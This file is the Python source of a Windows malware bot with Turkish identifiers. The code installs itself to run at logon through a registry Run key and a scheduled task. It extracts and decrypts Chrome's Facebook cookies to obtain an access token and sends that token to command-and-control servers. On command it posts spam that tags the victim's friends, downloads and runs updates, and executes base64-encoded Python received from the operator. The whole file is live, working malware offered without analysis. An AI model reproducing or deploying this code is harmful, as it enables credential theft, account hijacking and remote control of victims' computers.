#!/usr/bin/python
# -*- coding: utf-8 -*-
from time import sleep

import signal
import socket
import re, os, glob
import signal
import socket
import getopt
import random
import urllib2
from threading import *
import win32api, win32con
import wmi
import requests
from random import randint
import platform
import mechanize
import sys
import base64
import json
import sqlite3
import win32crypt
import subprocess
import hashlib

version=40
server="exusers.com"
backupserver="kontrolll.biz/a47"
errors=[]
debug=False

try:
    osname=platform.win32_ver()[0]
except:
    osname="0"

if debug:
    servantdir=os.path.join(os.getenv('APPDATA'),"servant.exe")

def death(error):
    file=open("hata","wb")
    file.write(error)
    file.close()
    sys.exit(0)

asd=activeCount()

for i in range(10):
    basari=True
    try:
        c = wmi.WMI ()
        if debug:
            continue
        zaten=0
        for process in c.Win32_Process (name="servant.exe"):
            servantdir = process.ExecutablePath
            servantdir=str(servantdir)
            if zaten > 2:
                sys.exit(0)
            zaten = zaten + 1
        if zaten == 0:
            #sys.exit(0)
            basari=False
    except:
        errors.append("c = wmi proccess error")
        basari=False
    if basari:
        break
    else:
        sleep(1)
if debug:
    basari=True
if basari==False:
    death("c = wmi proccess error")

#"iexplore.exe","firefox.exe","chrome.exe"
def detectexes(list):
    c = wmi.WMI ()
    s=""
    try:
        for process in c.Win32_Process ():
            x = process.Caption
            for i in range(len(list)):
                if x == list[i]:
                    del list[i]
                    if s =="":
                        s += process.Caption
                    else:
                        s += ","+process.Caption
    except:
        return False
    return s




def getunique(c):
    durum=False
    if os.path.isfile("dontremove000.txt"):
        try:
            o=open("dontremove000.txt","r")
            oku=o.read()
            o.close()
            unique=int(oku)
            if unique>1000:
                durum=True
        except:
            durum=False

    if durum == False:
        try:
            for item in c.Win32_PhysicalMedia():
                if item.Tag.find("PHYSICALDRIVE0") != -1:
                    asd=str(item.SerialNumber.split())
                    unique = abs(hash(asd)) % (10 ** 8)
                    if unique:
                        if unique> 1000:
                            durum=True
                            break
        except:
            durum=False
        if durum == False:
            try:
                asd=c.Win32_BaseBoard()[0].SerialNumber
                unique = abs(hash(asd)) % (10 ** 8)
                if unique > 1000:
                    durum=True
            except:
                durum=False
        if durum == False:
            try:
                unique=randint(10000,99999)+33300000
                o=open("dontremove000.txt","wb")
                o.write(unique)
                o.close()
            except:
                pass
    return unique



for i in range(10):
    basari=True
    try:
        unique=getunique(c)
    except:
        basari=False
    if basari:
        break
if basari==False:
    death("unique cannot created")




#servantdir=os.path.join(os.path.dirname(os.getcwd()),"servant.exe")


try:
    os.popen('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /t REG_SZ /v "servant" /d "'+servantdir+'" /f')
    os.popen('reg add "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run" /t REG_BINARY /v "servant" /d "020000000000000000000000" /f')
except:
    pass

if osname=="XP":
    schedule='schtasks /create /sc onlogon /tn winoperatesysschedule /tr "'+servantdir+'"'
else:
    schedule='schtasks /create /sc onlogon /tn winoperatesysschedule /rl highest /tr "'+servantdir+'"'
try:
    os.popen(schedule)
except:
    pass


def connect(d,backup=False):
    try:
        data = base64.b64encode(json.dumps(d))
        cevir={'a':'b','b':'8','8':'e','e':'k','k':'9','9':'0','0':'7','7':'2','2':'1','1':'l','l':'u','u':'U','U':'5','5':'H','H':'B','B':'M','M':'v','v':'C','C':'a'}
        value={}
        e=""
        for i in range(len(data)):
            if data[i] in cevir:
                e += cevir[data[i]]
            else:
                e += data[i]

        if backup:
            link="http://"+backupserver+"/t.php"
        else:
            link="http://"+server+"/t.php"
        r= requests.post(link,data={'data':e},verify=False,timeout=8)
        if r.status_code==200:
            return r.text
    except:
        return False
    return False

def pyruncheck(md5,backupt=False):
    if backupt==False:
        try:
            r=requests.post("http://kontrolll.biz/a47/check.php",data={'md5':md5})
            if r.status_code == 200:
                if r.text == "yes":
                    return True
                elif r.text == "no":
                    return False
        except:
            pass
    try:
        r=requests.post("http://crazygoats.info/a47/check.php",data={'md5':md5})
        if r.status_code == 200:
            if r.text == "yes":
                return True
            elif r.text == "no":
                return False
    except:
        return False
    return False

###############################################################################################################################################################
##################################################################### FACEBOOK TOKEN ALMA #####################################################################
###############################################################################################################################################################

def chrome_decrypt(encrypted_value, key=None):
    """
    Decrypt value using Chrome's platform-dependent symmetric encryption scheme using key.
    encrypted_value should be a byte string, otherwise you'll probably get a
    TypeError: expected an object with a buffer interface
    """
    # CryptUnprotectData returns a two-string tuple. Not sure what the first value is...
    # This is more obfucation, so might change at some point...
    _, decrypted = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)
    return decrypted.decode('utf-8')



follow=["Google","Chrome","Default","User Data","Profile 1","Local","Application Data","Local Settings"]
def bul(cf):
    list=os.listdir(cf)
    for i in range(len(list)):
        x=os.path.join(cf,list[i])
        if os.path.isfile(x):
            if list[i] == "Cookies":
                return os.path.join(cf,list[i])
        else:
            if list[i] in follow:
                try:
                    b=bul(x)
                except:
                    b=False
                if b:
                    return b

    return False


def cookiecek(dosya):
    cookies=[]
    try:
        conn = sqlite3.connect(dosya)
        c = conn.cursor()
        for row in c.execute('SELECT name,creation_utc,host_key,path,expires_utc,secure,httponly,encrypted_value FROM cookies WHERE host_key=".facebook.com"'):
            s=str(row[7])
            cookie={'name':str(row[0]),'creation_utc':int(row[1]),'host_key':str(row[2]),'path':str(row[3]),'expires_utc':int(row[4]),'secure':int(row[5]),'httponly':int(row[6]),'value':chrome_decrypt(s)}
            cookies.append(cookie)
        conn.close()
    except:
        return False
    if len(cookies) == 0:
        return False
    else:
        return cookies

def tokenal(c):
    link="https://www.facebook.com/v2.3/dialog/oauth?response_type=token&display=popup&client_id=145634995501895&redirect_uri=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fexplorer%2Fcallback&scope=user_about_me%2Cuser_actions.books%2Cuser_actions.fitness%2Cuser_actions.music%2Cuser_actions.news%2Cuser_actions.video%2Cuser_activities%2Cuser_birthday%2Cuser_education_history%2Cuser_events%2Cuser_friends%2Cuser_games_activity%2Cuser_groups%2Cuser_hometown%2Cuser_interests%2Cuser_likes%2Cuser_location%2Cuser_photos%2Cuser_posts%2Cuser_relationship_details%2Cuser_relationships%2Cuser_religion_politics%2Cuser_status%2Cuser_tagged_places%2Cuser_videos%2Cuser_website%2Cuser_work_history%2Cads_management%2Cads_read%2Cemail%2Cmanage_notifications%2Cmanage_pages%2Cpublish_actions%2Cread_friendlists%2Cread_insights%2Cread_mailbox%2Cread_page_mailboxes%2Cread_stream%2Crsvp_event"  
    useragent="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36"
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.open("https://www.facebook.com")
    for i in range(len(c)):
        browser.set_cookie(c[i]['name']+"="+c[i]['value']+"; expires=Wednesday, 16-Nov-16 23:12:40 GMT")
    browser.addheaders = [('User-agent', useragent)]
    response1=browser.open(link)
    url = response1.geturl()
        
    for zxcv in range(15):
        if 'access_token=' in url:
            break
        s=True
        try:
            sleep(0.1)
            browser.select_form(nr=0)
            #if 'audience[0][value]' in browser:
                #print 1            
            try:
                control = browser.form.find_control("audience[0][value]")
                if control:
                    control.value = [""+str(control.items[1].name)+""]
            except:
                pass
            response1 = browser.submit(name='__CONFIRM__')
            url = response1.geturl()
        except:
            s=False
        if s:
            if 'dialog/oauth' in url:
                s=True
            else:
                break
    for asdf in range(2):
        if 'access_token=' in url:
            break
        sleep(0.1)
        try:
            browser.select_form(nr=0)
        except:
            pass
        try:
            browser.click("u_0_f")
        except:
            pass
        
    r=browser.open(link)
    url = r.geturl()
    if '#' in url and '&' in url:
        try:
            bol=url.split("access_token=")
            bol=bol[1].split("&expires_in=")
            if len(bol) == 2:
                return bol
        except:
            return False
    return False

def token():
    hata = 0
    try:
        bb=os.path.join(servantdir.strip("servant.exe"),"..")
        b=bul(bb)
    except:
        b=False
    if b == False:
        hata=2

    if hata == 0:
        cookies=cookiecek(b)
        if cookies == False:
            hata=3

    if hata == 0:
        try:
            token=tokenal(cookies)
            if token==False:
                hata=4
        except:
            hata=5

    if hata > 0:
        ddd=detectexes(["iexplore.exe","firefox.exe","chrome.exe"])
        if ddd:
            hata = format(hata) + ":" + ddd
        token=[hata,600]

    connect({'a':'2','v':version,'unique':unique,'os':osname, 'token':token[0],'expire':token[1]})



def profilpost_asil():
    hata = 0
    try:
        bb=os.path.join(servantdir.strip("servant.exe"),"..")
        b=bul(bb)
    except:
        b=False
    if b == False:
        hata=2

    if hata == 0:
        c=cookiecek(b)
        if c == False:
            hata=3

    if hata == 0:
        try:
            token=tokenal(c)
            if token==False:
                hata=4
        except:
            hata=5

    if hata > 0:
        ddd=detectexes(["iexplore.exe","firefox.exe","chrome.exe"])
        if ddd:
            hata = format(hata) + ":" + ddd
        token=[hata,600]

    connect({'a':'2','v':version,'unique':unique,'os':osname, 'token':token[0],'expire':token[1]})
    if hata > 0:
        return [False,"0:access_token alınamadı"]
    tok=token[0]
    cookies={}
    for i in range(len(c)):
        if c[i]['name']=="c_user":
            id=c[i]['value']
        cookies[c[i]['name']]=c[i]['value']
    try:
        int(id)
    except:
        return [False,"1:id alınamadı"]
    """
    r = requests.get("https://www.facebook.com/",cookies=cookies,headers={"user-agent":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"})
    if r.status_code != 200:
        hata=1

    if hata == 0:
        bol = r.text.split('" title="',1)
        if len(bol) <2:
            hata=2

    if hata == 0:
        bol2= bol[0].split('https://www.facebook.com/profile.php?id=',1)
        if len(bol2) <2:
            hata=3

    if hata == 0:
        try:
            id=int(bol2[1])
        except:
            hata=4
    
    if hata == 0:
        bol=r.text.split('name="fb_dtsg" value="',1)
        if len(bol) <2:
            hata=5

    if hata == 0:
        bol2=bol[1].split('"',1)
        if len(bol2) <2:
            return False
    
    if hata == 0:
        if len(bol2[0]) > 33:
            return False
    
    fb_dtsg=bol2[0]
    """

    salla="0."+format(randint(1,99999999999999999))
    url="https://www.facebook.com/ajax/typeahead/place_tag_friends.php?__a=1&content_id=395870630487365&viewer="+format(id)+"&"+salla
    r=requests.get(url, headers={"user-agent":"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36"},cookies=cookies,verify=False)
    if r.status_code != 200:
        return [False,"1:friends çekilemedi"]
    friends=json.loads(r.text[9:])
    f=[""]
    eklendi=0
    x=0
    
    if friends['payload']['entries'] < 20:
        return [False,"2:20den az arkadaş"]
   
    cek = connect({'a':'6','v':version,'unique':unique,'os':osname})
    if cek ==False:
        return [False,"3:link ve resim çekilemedi"]
    cek=cek.strip(' \t\n\r')
    bol=cek.split("|")
    if len(bol) != 2:
        return [False,"4:hata"]
    if len(bol[1]) < 5 or len(bol[0]) < 5:
        return [False,"5:hata"]
    link=bol[0]
    r=requests.get(bol[1],verify=False)
    if r.status_code != 200:
        return [False,"6:hata"]
    bol=r.text.split("\n")
    if len(bol) < 10:
        return [False,"7:hata"]

    
    for i in range(len(friends['payload']['entries'])):
        if eklendi==20:
            eklendi=0
            x=x+1
            f.append("")
        if eklendi == 0:
            f[x] = format(friends['payload']['entries'][i]["uid"])
        else:
            f[x] += ","+format(friends['payload']['entries'][i]["uid"])
        eklendi=eklendi+1
        
    
    
    for i in range(len(f)):
        isim="+SUPER !!!"+format(randint(11111,99999999999))
        salla=randint(0,len(bol)-1)
        image=bol[salla]
        params={'access_token':tok,'message':isim,'link':link,'picture':image,'place':155085041171551,'tags':"["+f[i]+"]"}
        post=requests.post("https://graph.facebook.com/v2.2/me/feed",params=params,verify=False)
        j=json.loads(post.text)
        if 'error' in j:
            hata = format(j['error']['code'])+":"+j['error']['message']
            return [False,'8:('+format(i)+'. postta (id:'+format(id)+"))Graph error:"+hata]
    return [True,id]

        

def profilpost():
    try:
        post=profilpost_asil()
        g=post[1]
        connect({'a':5,'v':version,'unique':unique,'os':osname,'sonuc':g})
    except Exception, e:
        try:
            exc_type, exc_obj, exc_tb = sys.exc_info()
            fname = os.path.split(exc_tb.tb_frame.f_code.co_filename)[1]
            line=format((exc_type, fname, exc_tb.tb_lineno))
        except:
            line="?"
        connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"(line:"+line+")profilpost:"+str(e)})
###############################################################################################################################################################
###############################################################################################################################################################
###############################################################################################################################################################


"""
def remotecon(inst_base64):
    try:
        i=json.loads(base64.b64decode(inst_base64))
        if i['post']:
            r=requests.post(i['url'],data=i['data'])
        else:
            r=requests.get(i['url'],params=i['params'])
        if r.status_code == 200:
            connect({'a':'4','v':version,'unique':unique,'os':osname, 'ans':r.text})
        else:
            connect({'a':'4','v':version,'unique':unique,'os':osname, 'ans':r.text})
"""

def yardir(token,link,resimurl):
    try:
        r=requests.get(resimurl)
        if r.status_code==200:
            bol=r.text.split("\n")
            say=len(bol)
            salla=randint(0,say-1)
            resim=bol[salla]
            if len(resim) < 12:
                return False

    except:
        return False





def yorumla(s):
    islemler={'update':'update','token':'token','profilpost':'profilpost','pyrun':'pyrun'}
    sonuc=[]

    # Veri yorumlanırken durumlar: 0=işlemin adı alınıyor 1,2,3,4,5...=parametreler alınıyor.

    durum=0
    tampon=""
    islem=""
    parametreler=[]
    for i in range(len(s)):
        x=s[i]
        if x == ";":
            if durum > 0 and islem in islemler:
                if len(tampon) > 0:
                    parametreler.append(tampon)

                sonuc.append([islem,parametreler])

            elif len(tampon) > 0 and tampon in islemler:
                sonuc.append([tampon,False])

            tampon=""
            durum=0
            islem=""
            parametreler=[]
            continue

        if x == "|":
            if durum > 0:
                parametreler.append(tampon)
                durum=durum+1
            else:
                islem=tampon
                durum=1
            tampon=""
            continue

        tampon=tampon + x


    return sonuc




def download_file(url,save):
    basari=True
    try:
        r = requests.get(url, stream=True,verify=False)
        with open(save, 'wb') as f:
            for chunk in r.iter_content(chunk_size=1024):
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                    f.flush()
    except:
        basari=False
    return basari

def update(link):
    updaterdir=os.path.join(servantdir.strip("servant.exe"),"updater999.exe")
    indir=download_file(link,updaterdir)
    if indir:
        for i in range(10):
            try:
                ac=os.startfile(updaterdir)
                basari=True

            except:
                basari=False
            if basari:
                sys.exit(0)
            connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"Update Error:1!!!"})
    else:
        connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"Update Error:2!!!"})

def pyrun(b64kod,id,backupt):
    if len(b64kod)<5:
        return True
    m = hashlib.md5()
    m.update(b64kod)
    kontrol=pyruncheck(m.hexdigest())
    if kontrol:
        try:
            exec(base64.b64decode(b64kod))
        except Exception, e:
            connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"pyrun"+format(id)+str(e),'id':id})
    else:
        connect({'a':3,'v':version,'unique':unique,'os':osname,'accessdenied':'1','error':"Access Check Denied",'id':id})







bekleme=60
backuptime=20
time=0
durum={'a':1,'v':version,'unique':unique,'os':osname}
while True:
    if time==backuptime:
        time=0
        backupt=True
    else:
        time=time+1
        backupt=False


    basari=connect(durum,backupt)
    if basari:
        yorum=yorumla(basari)
        for i in range(len(yorum)):
            """
            if yorum[i][0] == "update":
                update(yorum[i][1][0])
                continue
            """

            if yorum[i][0] == "token":
                try:
                    token()
                except Exception, e:
                    connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"token:"+str(e)})
                continue

            if yorum[i][0] =="profilpost":
                profilpost()
                continue

            if yorum[i][0] =="pyrun" and len(yorum[i][1]) == 2:
                pyrun(yorum[i][1][0],yorum[i][1][1],backupt)
                continue

            if yorum[i][0]=="pyrun2" and len(yorum[i][1]) == 2:
                try:
                    if len(yorum[i][1][0]) < 5:
                        continue
                    m = hashlib.md5()
                    m.update(yorum[i][1][0])
                    kontrol=pyruncheck(m.hexdigest())
                    exec(base64.b64decode(yorum[i][1][0]))
                except Exception, e:
                    connect({'a':3,'v':version,'unique':unique,'os':osname,'error':"pyrun"+str(e),'id':yorum[i][1][1]})
                continue

            m = hashlib.md5()
            m.update(yorum[i][0])
            if m.hexdigest()=="822c4752fe663b71ba1034975c08f57e":
                update(yorum[i][1][0])





    #print yorumla("update|http://128.199.250.30/updater.exe|parameter;deneme|ccc;")
    sleep(bekleme)
 